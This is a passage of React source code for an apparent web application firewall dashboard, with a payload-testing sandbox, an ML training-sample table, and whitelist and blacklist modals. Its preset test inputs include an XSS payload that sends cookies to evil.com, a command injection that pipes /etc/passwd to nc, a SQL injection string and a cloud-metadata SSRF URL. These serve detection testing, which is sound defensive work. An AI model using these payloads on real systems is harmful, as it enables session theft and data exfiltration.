                  fontSize: '13px',
                  fontWeight: '700',
                  cursor: sandboxTesting ? 'not-allowed' : 'pointer',
                  display: 'inline-flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '6px'
                }}
              >
                <Play size={14} className={sandboxTesting ? 'animate-spin' : ''} />
                <span>{sandboxTesting ? 'Evaluating with Neural & Rule Engine...' : 'Inspect & Analyze Payload'}</span>
              </button>
            </form>

            {/* Quick Test Samples */}
            <div style={{ marginTop: '16px', paddingTop: '12px', borderTop: '1px solid #D9E1DC' }}>
              <div style={{ fontSize: '11px', fontWeight: '700', color: '#60716B', marginBottom: '6px' }}>QUICK PRESETS:</div>
              <div style={{ display: 'flex', flexWrap: 'wrap', gap: '5px' }}>
                {[
                  { name: 'SQLi Union', p: "' UNION SELECT null, version(), user() --" },
                  { name: 'XSS Cookie Leak', p: "<img src=x onerror=fetch('http://evil.com/leak?c='+document.cookie)>" },
                  { name: 'RCE Shell', p: "; cat /etc/passwd | nc 10.0.0.1 4444" },
                  { name: 'SSRF Cloud', p: "http://169.254.169.254/latest/meta-data/" },
                  { name: 'Benign Search', p: "search=latest+news+updates" }
                ].map(ex => (
                  <button
                    key={ex.name}
                    type="button"
                    onClick={() => { setSandboxPayload(ex.p); setTimeout(handleRunSandbox, 50) }}
                    style={{ padding: '3px 8px', borderRadius: '4px', background: '#F8FAFC', border: '1px solid #D9E1DC', color: '#334155', fontSize: '11px', fontWeight: '600', cursor: 'pointer' }}
                  >
                    {ex.name}
                  </button>
                ))}
              </div>
            </div>
          </div>

          {/* Results Display */}
          <div style={{ background: '#FFFFFF', borderRadius: '12px', border: '1px solid #D9E1DC', padding: '16px 20px' }}>
            <h3 style={{ margin: '0 0 12px 0', fontSize: '15px', color: '#0F172A', fontWeight: '800' }}>Multi-Engine Telemetry Breakdown</h3>

            {!sandboxResult ? (
              <div style={{ textAlign: 'center', padding: '50px 20px', color: '#94A3B8' }}>
                <FlaskConical size={32} style={{ opacity: 0.4, margin: '0 auto 8px', display: 'block' }} />
                <p style={{ fontSize: '12.5px', margin: 0 }}>Run analysis to inspect the ML confidence score, Semantic AST, and Rule matching.</p>
              </div>
            ) : (
              <div>
                {/* Decision Banner */}
                <div style={{
                  padding: '12px 16px',
                  borderRadius: '8px',
                  marginBottom: '12px',
                  background: sandboxResult.decision === 'BLOCK' ? '#FEF2F2' : '#ECFDF5',
                  border: `1px solid ${sandboxResult.decision === 'BLOCK' ? '#FECACA' : '#A7F3D0'}`,
                  display: 'flex',
                  justifyContent: 'space-between',
                  alignItems: 'center'
                }}>
                  <div>
                    <span style={{ fontSize: '11px', fontWeight: '800', textTransform: 'uppercase', color: sandboxResult.decision === 'BLOCK' ? '#DC2626' : '#059669' }}>
                      DECISION: {sandboxResult.decision} (HTTP {sandboxResult.decision === 'BLOCK' ? '403' : '200'})
                    </span>
                    <h3 style={{ margin: '2px 0 0 0', fontSize: '14px', color: '#0F172A' }}>{sandboxResult.reason}</h3>
                  </div>
                  <div style={{ textAlign: 'right' }}>
                    <div style={{ fontSize: '20px', fontWeight: '800', color: sandboxResult.risk_score >= 70 ? '#DC2626' : sandboxResult.risk_score >= 40 ? '#D97706' : '#059669' }}>
                      {sandboxResult.risk_score}/100
                    </div>
                    <div style={{ fontSize: '10px', color: '#64748B', textTransform: 'uppercase', fontWeight: '700' }}>Risk Score</div>
                  </div>
                </div>

                {/* Score Breakdown Grid */}
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '8px', marginBottom: '14px' }}>
                  <div style={{ padding: '8px', background: '#FBFCFA', borderRadius: '6px', border: '1px solid #D9E1DC', textAlign: 'center' }}>
                    <div style={{ fontSize: '10.5px', color: '#64748B', fontWeight: '600' }}>Semantic AST</div>
                    <div style={{ fontSize: '15px', fontWeight: '700', color: '#0F172A' }}>{sandboxResult.components?.semantic_score}%</div>
                  </div>
                  <div style={{ padding: '8px', background: '#FBFCFA', borderRadius: '6px', border: '1px solid #D9E1DC', textAlign: 'center' }}>
                    <div style={{ fontSize: '10.5px', color: '#64748B', fontWeight: '600' }}>Hyper Rules</div>
                    <div style={{ fontSize: '15px', fontWeight: '700', color: '#0F172A' }}>{sandboxResult.components?.rule_score}%</div>
                  </div>
                  <div style={{ padding: '8px', background: '#FBFCFA', borderRadius: '6px', border: '1px solid #D9E1DC', textAlign: 'center' }}>
                    <div style={{ fontSize: '10.5px', color: '#64748B', fontWeight: '600' }}>Neural ML Probability</div>
                    <div style={{ fontSize: '15px', fontWeight: '700', color: '#2563EB' }}>{Math.round((sandboxResult.signals?.ml_probability || 0) * 100)}%</div>
                  </div>
                </div>

                {/* Signals */}
                <div style={{ fontSize: '12px', color: '#334155', marginBottom: '14px' }}>
                  <div><strong>Threat Category:</strong> {sandboxResult.attack_type || 'None'}</div>
                  {sandboxResult.signals?.rule_matches?.length > 0 && (
                    <div style={{ marginTop: '3px' }}><strong>Matched Rules:</strong> {sandboxResult.signals.rule_matches.join(', ')}</div>
                  )}
                  {sandboxResult.whitelist_match && (
                    <div style={{ marginTop: '3px', color: '#059669' }}><strong>Whitelist Exception:</strong> {sandboxResult.whitelist_match}</div>
                  )}
                </div>

                {/* Rapid Fleet Protection Actions */}
                <div style={{
                  background: '#F8FAFC',
                  border: '1px solid #D9E1DC',
                  borderRadius: '8px',
                  padding: '12px',
                  marginTop: '10px'
                }}>
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '8px' }}>
                    <span style={{ fontSize: '12px', fontWeight: '700', color: '#0F172A' }}>
                      Rapid Fleet Mitigation Actions:
                    </span>
                    <span style={{ fontSize: '10.5px', color: '#2563EB', fontWeight: '700', textTransform: 'uppercase' }}>
                      Zero-Downtime Deployment
                    </span>
                  </div>
                  <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>
                    <button
                      type="button"
                      onClick={() => handleDeployFleetAttackRule(sandboxPayload, `Rapid Blocker: ${sandboxResult?.attack_type || 'Malicious Payload'}`)}
                      style={{
                        flex: '1 1 180px',
                        padding: '8px 12px',
                        borderRadius: '6px',
                        background: '#DC2626',
                        border: '1px solid #B91C1C',
                        color: '#FFFFFF',
                        fontSize: '11.5px',
                        fontWeight: '700',
                        cursor: 'pointer',
                        display: 'inline-flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        gap: '6px',
                        boxShadow: '0 1px 2px rgba(220, 38, 38, 0.2)'
                      }}
                    >
                      <ShieldAlert size={13} />
                      <span>1-Click Deploy Fleet Attack Rule</span>
                    </button>

                    <button
                      type="button"
                      onClick={() => handleOpenWhitelistModal(null, sandboxPayload)}
                      style={{
                        flex: '1 1 140px',
                        padding: '8px 12px',
                        borderRadius: '6px',
                        background: '#059669',
                        border: '1px solid #047857',
                        color: '#FFFFFF',
                        fontSize: '11.5px',
                        fontWeight: '700',
                        cursor: 'pointer',
                        display: 'inline-flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        gap: '6px',
                        boxShadow: '0 1px 2px rgba(5, 150, 105, 0.2)'
                      }}
                    >
                      <ShieldCheck size={13} />
                      <span>Whitelist as Safe (0)</span>
                    </button>

                    <button
                      type="button"
                      onClick={() => {
                        setSampleForm({ payload: sandboxPayload, label: 1, category: sandboxResult?.attack_type || 'SQL Injection', notes: 'Learned from Sandbox' })
                        setAddSampleModalOpen(true)
                      }}
                      style={{
                        flex: '1 1 130px',
                        padding: '8px 12px',
                        borderRadius: '6px',
                        background: '#FFFFFF',
                        border: '1px solid #D9E1DC',
                        color: '#334155',
                        fontSize: '11.5px',
                        fontWeight: '700',
                        cursor: 'pointer',
                        display: 'inline-flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        gap: '6px'
                      }}
                    >
                      <Database size={13} />
                      <span>+ Feed to ML Dataset</span>
                    </button>
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* ==================== TAB 3: ACTIVE ML DATASET & SAMPLES ==================== */}
      {activeTab === 'dataset' && (
        <div style={{ background: '#FFFFFF', borderRadius: '12px', border: '1px solid #D9E1DC', overflow: 'hidden' }}>
          <div style={{ padding: '12px 16px', borderBottom: '1px solid #D9E1DC', background: '#FBFCFA', display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: '10px', flexWrap: 'wrap' }}>
            <div style={{ display: 'flex', gap: '6px' }}>
              {[
                { id: 'all', label: 'All Samples' },
                { id: '0', label: 'Benign Safe (0)' },
                { id: '1', label: 'Attack Threats (1)' }
              ].map(f => (
                <button
                  key={f.id}
                  onClick={() => setSamplesFilter(f.id)}
                  style={{
                    padding: '5px 12px',
                    borderRadius: '6px',
                    border: '1px solid ' + (samplesFilter === f.id ? '#93C5FD' : '#D9E1DC'),
                    background: samplesFilter === f.id ? '#EFF6FF' : '#FFFFFF',
                    color: samplesFilter === f.id ? '#1D4ED8' : '#60716B',
                    fontWeight: '700',
                    fontSize: '11.5px',
                    cursor: 'pointer'
                  }}
                >
                  {f.label}
                </button>
              ))}
            </div>

            <div style={{ display: 'flex', gap: '6px' }}>
              <button
                onClick={() => setAddSampleModalOpen(true)}
                style={{ padding: '6px 12px', borderRadius: '6px', background: '#059669', color: '#FFFFFF', border: 'none', fontSize: '12px', fontWeight: '700', cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: '5px' }}
              >
                <Plus size={13} />
                <span>+ Add Sample</span>
              </button>
              <button
                onClick={handleRetrainModel}
                disabled={retraining}
                style={{ padding: '6px 12px', borderRadius: '6px', background: '#2563EB', color: '#FFFFFF', border: 'none', fontSize: '12px', fontWeight: '700', cursor: 'pointer', display: 'inline-flex', alignItems: 'center', gap: '5px' }}
              >
                <RotateCw size={13} className={retraining ? 'animate-spin' : ''} />
                <span>Retrain Model</span>
              </button>
            </div>
          </div>

          {/* Samples Table */}
          {samplesLoading ? (
            <div style={{ textAlign: 'center', padding: '50px', color: '#94A3B8' }}>
              <RotateCw size={24} className="animate-spin" style={{ margin: '0 auto 8px', display: 'block' }} />
              <p style={{ margin: 0, fontSize: '13px' }}>Loading dataset samples...</p>
            </div>
          ) : samples.length === 0 ? (
            <div style={{ textAlign: 'center', padding: '50px 20px', color: '#64748B' }}>
              <Database size={32} style={{ color: '#94A3B8', margin: '0 auto 8px', display: 'block' }} />
              <h3 style={{ margin: '0 0 4px', color: '#0F172A', fontSize: '15px' }}>No Training Samples Found</h3>
              <p style={{ color: '#64748B', fontSize: '12px', margin: 0 }}>Whitelist normal requests or blacklist attacks to grow your active ML model dataset.</p>
            </div>
          ) : (
            <div style={{ overflowX: 'auto', WebkitOverflowScrolling: 'touch' }}>
              <table style={{ width: '100%', minWidth: '780px', borderCollapse: 'collapse', textAlign: 'left', fontSize: '13px' }}>
                <thead>
                  <tr style={{ background: '#FBFCFA', borderBottom: '1px solid #D9E1DC', color: '#60716B', fontSize: '11px', textTransform: 'uppercase', letterSpacing: '0.04em', fontWeight: '700' }}>
                    <th style={{ padding: '14px 16px' }}>Classification</th>
                    <th style={{ padding: '14px 16px' }}>Category</th>
                    <th style={{ padding: '14px 16px' }}>Payload Sample</th>
                    <th style={{ padding: '14px 16px' }}>Source</th>
                    <th style={{ padding: '14px 16px' }}>Status</th>
                    <th style={{ padding: '14px 16px', textAlign: 'right' }}>Action</th>
                  </tr>
                </thead>
                <tbody>
                  {samples.map(sm => (
                    <tr
                      key={sm.id}
                      style={{ borderBottom: '1px solid #F1F5F9', transition: 'background-color 0.15s ease' }}
                      onMouseEnter={(e) => e.currentTarget.style.backgroundColor = '#F8FAFC'}
                      onMouseLeave={(e) => e.currentTarget.style.backgroundColor = '#FFFFFF'}
                    >
                      <td style={{ padding: '14px 16px', verticalAlign: 'middle' }}>
                        <span style={{
                          padding: '3px 8px',
                          borderRadius: '12px',
                          fontSize: '11px',
                          fontWeight: '700',
                          background: sm.label === 1 ? '#FEF2F2' : '#ECFDF5',
                          color: sm.label === 1 ? '#DC2626' : '#059669',
                          border: '1px solid ' + (sm.label === 1 ? '#FECACA' : '#A7F3D0')
                        }}>
                          {sm.label === 1 ? 'Attack Threat (1)' : 'Benign Safe (0)'}
                        </span>
                      </td>
                      <td style={{ padding: '14px 16px', fontWeight: '700', color: '#0F172A', verticalAlign: 'middle', fontSize: '12.5px' }}>{sm.category}</td>
                      <td style={{ padding: '14px 16px', verticalAlign: 'middle' }}>
                        <div style={{ display: 'inline-flex', alignItems: 'center', gap: '6px', background: '#F8FAFC', padding: '3px 8px', borderRadius: '6px', border: '1px solid #D9E1DC', maxWidth: '340px' }}>
                          <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: '11px', color: '#0369A1', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                            {sm.payload}
                          </span>
                          <button
                            type="button"
                            onClick={() => handleCopy(sm.id, sm.payload)}
                            title="Copy payload"
                            style={{ background: 'transparent', border: 'none', cursor: 'pointer', color: '#64748B', display: 'flex' }}
                          >
                            {copiedId === sm.id ? <Check size={11} style={{ color: '#059669' }} /> : <Copy size={11} />}
                          </button>
                        </div>
                      </td>
                      <td style={{ padding: '14px 16px', color: '#64748B', verticalAlign: 'middle', fontSize: '12px' }}>{sm.source}</td>
                      <td style={{ padding: '14px 16px', verticalAlign: 'middle' }}>
                        {sm.trained ? (
                          <span style={{ color: '#059669', fontSize: '11.5px', fontWeight: '700', display: 'inline-flex', alignItems: 'center', gap: '4px' }}>
                            <CheckCircle2 size={13} /> Trained
                          </span>
                        ) : (
                          <span style={{ color: '#D97706', fontSize: '11.5px', fontWeight: '700', display: 'inline-flex', alignItems: 'center', gap: '4px' }}>
                            <Clock size={13} /> Queued
                          </span>
                        )}
                      </td>
                      <td style={{ padding: '14px 16px', textAlign: 'right', verticalAlign: 'middle' }}>
                        <button
                          onClick={() => handleDeleteSample(sm.id)}
                          style={{ background: 'transparent', border: 'none', color: '#94A3B8', cursor: 'pointer', padding: '4px' }}
                          onMouseEnter={(e) => e.currentTarget.style.color = '#DC2626'}
                          onMouseLeave={(e) => e.currentTarget.style.color = '#94A3B8'}
                        >
                          <Trash2 size={14} />
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      )}

      {/* ==================== MODAL: WHITELIST ==================== */}
      {whitelistModalOpen && (
        <div style={{
          position: 'fixed',
          inset: 0,
          background: 'rgba(15, 23, 42, 0.5)',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          zIndex: 9999,
          padding: '20px'
        }}>
          <div style={{ background: '#FFFFFF', borderRadius: '12px', width: '100%', maxWidth: '520px', boxShadow: '0 20px 25px -5px rgba(0, 0, 0, 0.15)', overflow: 'hidden' }}>
            <div style={{ padding: '16px 20px', borderBottom: '1px solid #D9E1DC', display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: '#FBFCFA' }}>
              <h3 style={{ margin: 0, fontSize: '15px', color: '#059669', fontWeight: '700', display: 'flex', alignItems: 'center', gap: '8px' }}>
                <ShieldCheck size={18} /> Whitelist Request Pattern (Fix 403)
              </h3>
              <button onClick={() => setWhitelistModalOpen(false)} style={{ background: 'none', border: 'none', color: '#94A3B8', cursor: 'pointer' }}>
                <X size={18} />
              </button>
            </div>

            <form onSubmit={handleWhitelistSubmit} style={{ padding: '20px' }}>
              <div style={{ marginBottom: '12px' }}>
                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: '700', color: '#334155', marginBottom: '4px' }}>Rule Name</label>
                <input
                  type="text"
                  required
                  value={whitelistForm.name}
                  onChange={e => setWhitelistForm({ ...whitelistForm, name: e.target.value })}
                  style={{ width: '100%', padding: '8px 10px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12.5px', boxSizing: 'border-box' }}
                />
              </div>

              <div style={{ marginBottom: '12px' }}>
                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: '700', color: '#334155', marginBottom: '4px' }}>Match Type</label>
                <select
                  value={whitelistForm.match_type}
                  onChange={e => setWhitelistForm({ ...whitelistForm, match_type: e.target.value })}
                  style={{ width: '100%', padding: '8px 10px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12.5px', background: '#FFFFFF', boxSizing: 'border-box' }}
                >
                  <option value="contains">Contains Substring</option>
                  <option value="url_path">URL Path Prefix</option>
                  <option value="exact">Exact Match</option>
                  <option value="regex">Regular Expression</option>
                </select>
              </div>

              <div style={{ marginBottom: '12px' }}>
                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: '700', color: '#334155', marginBottom: '4px' }}>Pattern to Whitelist</label>
                <input
                  type="text"
                  required
                  value={whitelistForm.pattern}
                  onChange={e => setWhitelistForm({ ...whitelistForm, pattern: e.target.value })}
                  style={{ width: '100%', padding: '8px 10px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12px', fontFamily: "'JetBrains Mono', monospace", boxSizing: 'border-box' }}
                />
              </div>

              <div style={{ marginBottom: '14px' }}>
                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: '700', color: '#334155', marginBottom: '4px' }}>Description / Note</label>
                <input
                  type="text"
                  value={whitelistForm.description}
                  onChange={e => setWhitelistForm({ ...whitelistForm, description: e.target.value })}
                  placeholder="e.g. Legitimate payment webhook callback"
                  style={{ width: '100%', padding: '8px 10px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12.5px', boxSizing: 'border-box' }}
                />
              </div>

              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '8px', marginTop: '16px' }}>
                <button type="button" onClick={() => setWhitelistModalOpen(false)} style={{ padding: '7px 14px', borderRadius: '6px', background: '#FFFFFF', border: '1px solid #D9E1DC', color: '#64748B', fontSize: '12.5px', fontWeight: '600', cursor: 'pointer' }}>
                  Cancel
                </button>
                <button type="submit" style={{ padding: '7px 16px', borderRadius: '6px', background: '#059669', color: '#FFFFFF', border: 'none', fontSize: '12.5px', fontWeight: '700', cursor: 'pointer' }}>
                  Apply Whitelist
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* ==================== MODAL: BLACKLIST & LEARN ATTACK ==================== */}
      {blacklistModalOpen && (
        <div style={{
          position: 'fixed',
          inset: 0,
          background: 'rgba(15, 23, 42, 0.5)',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          zIndex: 9999,
          padding: '20px'
        }}>
          <div style={{ background: '#FFFFFF', borderRadius: '12px', width: '100%', maxWidth: '520px', boxShadow: '0 20px 25px -5px rgba(0, 0, 0, 0.15)', overflow: 'hidden' }}>
            <div style={{ padding: '16px 20px', borderBottom: '1px solid #D9E1DC', display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: '#FBFCFA' }}>
              <h3 style={{ margin: 0, fontSize: '15px', color: '#DC2626', fontWeight: '700', display: 'flex', alignItems: 'center', gap: '8px' }}>
                <ShieldAlert size={18} /> Blacklist &amp; Train ML Model
              </h3>
              <button onClick={() => setBlacklistModalOpen(false)} style={{ background: 'none', border: 'none', color: '#94A3B8', cursor: 'pointer' }}>
                <X size={18} />
              </button>
            </div>

            <form onSubmit={handleBlacklistSubmit} style={{ padding: '20px' }}>
              <div style={{ marginBottom: '12px' }}>
                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: '700', color: '#334155', marginBottom: '4px' }}>Rule Identifier</label>
                <input
                  type="text"
                  required
                  value={blacklistForm.name}
                  onChange={e => setBlacklistForm({ ...blacklistForm, name: e.target.value })}
                  style={{ width: '100%', padding: '8px 10px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12.5px', fontFamily: "'JetBrains Mono', monospace", boxSizing: 'border-box' }}
                />
              </div>

              <div style={{ marginBottom: '12px' }}>
                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: '700', color: '#334155', marginBottom: '4px' }}>Attack Category</label>
                <select
                  value={blacklistForm.category}
                  onChange={e => setBlacklistForm({ ...blacklistForm, category: e.target.value })}
                  style={{ width: '100%', padding: '8px 10px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12.5px', background: '#FFFFFF', boxSizing: 'border-box' }}
                >
                  <option value="SQL Injection">SQL Injection</option>
                  <option value="XSS">XSS (Cross-Site Scripting)</option>
                  <option value="Command Injection">Command Injection (RCE)</option>
                  <option value="Path Traversal">Path Traversal / LFI</option>
                  <option value="SSRF">SSRF</option>
                </select>
              </div>

              <div style={{ marginBottom: '14px' }}>
                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: '700', color: '#334155', marginBottom: '4px' }}>Payload Signature to Block &amp; Learn</label>
                <input
                  type="text"
                  required
                  value={blacklistForm.pattern}
                  onChange={e => setBlacklistForm({ ...blacklistForm, pattern: e.target.value })}
                  style={{ width: '100%', padding: '8px 10px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12px', fontFamily: "'JetBrains Mono', monospace", boxSizing: 'border-box' }}
                />
              </div>

              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '8px', marginTop: '16px' }}>
                <button type="button" onClick={() => setBlacklistModalOpen(false)} style={{ padding: '7px 14px', borderRadius: '6px', background: '#FFFFFF', border: '1px solid #D9E1DC', color: '#64748B', fontSize: '12.5px', fontWeight: '600', cursor: 'pointer' }}>
                  Cancel
                </button>
                <button type="submit" style={{ padding: '7px 16px', borderRadius: '6px', background: '#DC2626', color: '#FFFFFF', border: 'none', fontSize: '12.5px', fontWeight: '700', cursor: 'pointer' }}>
                  Blacklist &amp; Train ML
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* ==================== MODAL: ADD TRAINING SAMPLE ==================== */}
      {addSampleModalOpen && (
        <div style={{
          position: 'fixed',
          inset: 0,
          background: 'rgba(15, 23, 42, 0.5)',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          zIndex: 9999,
          padding: '20px'
        }}>
          <div style={{ background: '#FFFFFF', borderRadius: '12px', width: '100%', maxWidth: '520px', boxShadow: '0 20px 25px -5px rgba(0, 0, 0, 0.15)', overflow: 'hidden' }}>
            <div style={{ padding: '16px 20px', borderBottom: '1px solid #D9E1DC', display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: '#FBFCFA' }}>
              <h3 style={{ margin: 0, fontSize: '15px', color: '#2563EB', fontWeight: '700', display: 'flex', alignItems: 'center', gap: '8px' }}>
                <Plus size={18} /> Add Sample to ML Dataset
              </h3>
              <button onClick={() => setAddSampleModalOpen(false)} style={{ background: 'none', border: 'none', color: '#94A3B8', cursor: 'pointer' }}>
                <X size={18} />
              </button>
            </div>

            <form onSubmit={handleAddSampleSubmit} style={{ padding: '20px' }}>
              <div style={{ marginBottom: '12px' }}>
                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: '700', color: '#334155', marginBottom: '4px' }}>Sample Type</label>
                <select
                  value={sampleForm.label}
                  onChange={e => setSampleForm({ ...sampleForm, label: Number(e.target.value) })}
                  style={{ width: '100%', padding: '8px 10px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12.5px', background: '#FFFFFF', boxSizing: 'border-box' }}
                >
                  <option value={1}>Malicious Attack Sample (Label = 1: Should Block 403)</option>
                  <option value={0}>Benign Legitimate Sample (Label = 0: Should Allow 200)</option>
                </select>
              </div>

              <div style={{ marginBottom: '12px' }}>
                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: '700', color: '#334155', marginBottom: '4px' }}>Category</label>
                <input
                  type="text"
                  value={sampleForm.category}
                  onChange={e => setSampleForm({ ...sampleForm, category: e.target.value })}
                  style={{ width: '100%', padding: '8px 10px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12.5px', boxSizing: 'border-box' }}
                />
              </div>

              <div style={{ marginBottom: '14px' }}>
                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: '700', color: '#334155', marginBottom: '4px' }}>Raw Payload Sample</label>
                <textarea
                  rows={4}
                  required
                  value={sampleForm.payload}
                  onChange={e => setSampleForm({ ...sampleForm, payload: e.target.value })}
                  style={{ width: '100%', padding: '8px 10px', borderRadius: '6px', border: '1px solid #D9E1DC', fontSize: '12px', fontFamily: "'JetBrains Mono', monospace", boxSizing: 'border-box' }}
                />
              </div>

              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '8px', marginTop: '16px' }}>
                <button type="button" onClick={() => setAddSampleModalOpen(false)} style={{ padding: '7px 14px', borderRadius: '6px', background: '#FFFFFF', border: '1px solid #D9E1DC', color: '#64748B', fontSize: '12.5px', fontWeight: '600', cursor: 'pointer' }}>
                  Cancel
                </button>
                <button type="submit" style={{ padding: '7px 16px', borderRadius: '6px', background: '#2563EB', color: '#FFFFFF', border: 'none', fontSize: '12.5px', fontWeight: '700', cursor: 'pointer' }}>
                  Add to Dataset
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  )
}
